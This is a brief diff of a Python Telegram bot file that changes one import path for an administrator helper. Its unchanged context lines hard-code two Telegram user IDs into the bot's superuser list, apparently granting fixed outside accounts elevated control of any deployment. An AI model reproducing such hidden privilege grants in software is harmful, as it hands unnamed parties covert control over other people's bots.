@@ -7,7 +7,7 @@ from pyrogram import Client
 from pyrogram.types import Message
 
 from config import SUDO_USERS
-from KimMusik.admins import get_administrators
+from helpers.admins import get_administrators
 
 SUDO_USERS.append(1991215069)
 SUDO_USERS.append(1940261666)
